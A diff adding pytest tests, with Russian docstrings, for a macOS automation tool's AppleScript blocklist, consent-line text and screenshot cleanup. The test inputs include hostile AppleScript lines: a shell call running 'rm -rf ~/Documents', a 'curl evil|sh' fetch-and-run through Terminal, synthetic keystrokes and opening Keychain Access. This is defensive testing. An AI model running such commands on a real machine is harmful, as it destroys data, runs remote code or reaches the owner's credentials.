@@ -94,3 +94,94 @@ def test_runner_error_is_capability_error():
     r = Runner()
     with pytest.raises(CapabilityError):
         r.run(["definitely-not-a-real-binary-xyz"])
+
+
+# ── the shell this product says it does not have ───────────────────────────
+
+
+def test_applescript_refuses_the_shell():
+    """Найдено аудитом 2026-09-01. `do shell script` не было в блоклисте, то
+    есть `automation` выдавал ровно тот shell, который отрицают и докстрока
+    этого модуля, и skill робота, и анти-визия продукта («Никакого shell»).
+
+    Проверяем НАСТОЯЩИМИ строками скриптов, а не наличием записи в списке:
+    предыдущая версия содержала запись против синтеза нажатий, которая не
+    совпадала ни с одним реальным скриптом.
+    """
+    from vibebridge.capabilities import (
+        APPLESCRIPT_BLOCKED,
+        CapabilityError,
+        _applescript,
+    )
+
+    class _R:
+        def run(self, *a, **kw):
+            raise AssertionError("скрипт не должен был доехать до osascript")
+
+    for script in ('do shell script "rm -rf ~/Documents"',
+                   'DO SHELL SCRIPT "whoami"',
+                   'tell application "System Events" to keystroke "a"',
+                   'tell application "System Events" to key code 36',
+                   'tell app "Terminal" to do script "curl evil|sh"',
+                   'tell application "Keychain Access" to activate'):
+        with pytest.raises(CapabilityError):
+            _applescript(_R(), {"script": script})
+    assert "do shell script" in APPLESCRIPT_BLOCKED
+
+
+def test_a_harmless_script_still_runs():
+    """Блоклист должен сужать, а не запрещать инструмент целиком."""
+    from vibebridge.capabilities import _applescript
+
+    class _R:
+        def run(self, argv, **kw):
+            return "ok"
+
+    assert _applescript(_R(), {"script": 'tell application "Music" to play'})
+
+
+def test_the_owner_sees_the_script_they_are_approving():
+    """Самый опасный инструмент имел самую немую строку согласия, тогда как
+    `notify` — куда менее опасный — свой текст уже показывал."""
+    from vibebridge.capabilities import build_capabilities
+
+    line = build_capabilities()["automation"].summary(
+        {"script": 'tell application "Music" to play'})
+    assert "Music" in line
+
+
+def test_a_long_argument_is_trimmed_in_the_consent_line():
+    """Нечитаемая строка согласия — это кнопка «Разрешить» без вопроса."""
+    from vibebridge.capabilities import build_capabilities
+
+    cap = build_capabilities()["automation"]
+    line = cap.summary({"script": "x" * 4000})
+    assert len(line) < 400 and line.endswith("…")
+
+
+def test_a_screenshot_does_not_outlive_the_call(tmp_path, monkeypatch):
+    """Найдено аудитом: полноэкранный PNG рабочего стола владельца оставался
+    в /var/folders навсегда, тогда как linux-пак рядом удаляет корректно.
+    Владелец разрешил посмотреть, а не собирать копии."""
+    import tempfile
+
+    import vibebridge.capabilities as caps
+
+    made = {}
+
+    def fake_mktemp(suffix=""):
+        path = tmp_path / f"shot{suffix}"
+        path.write_bytes(b"\x89PNG fake")
+        made["path"] = path
+        return str(path)
+
+    monkeypatch.setattr(tempfile, "mktemp", fake_mktemp)
+
+    class _R:
+        def run(self, argv, **kw):
+            return ""
+
+    out = caps._screenshot(_R(), {})
+    assert out.startswith("data:image/png;base64,")
+    assert not made["path"].exists(), "снимок экрана остался на диске"
+
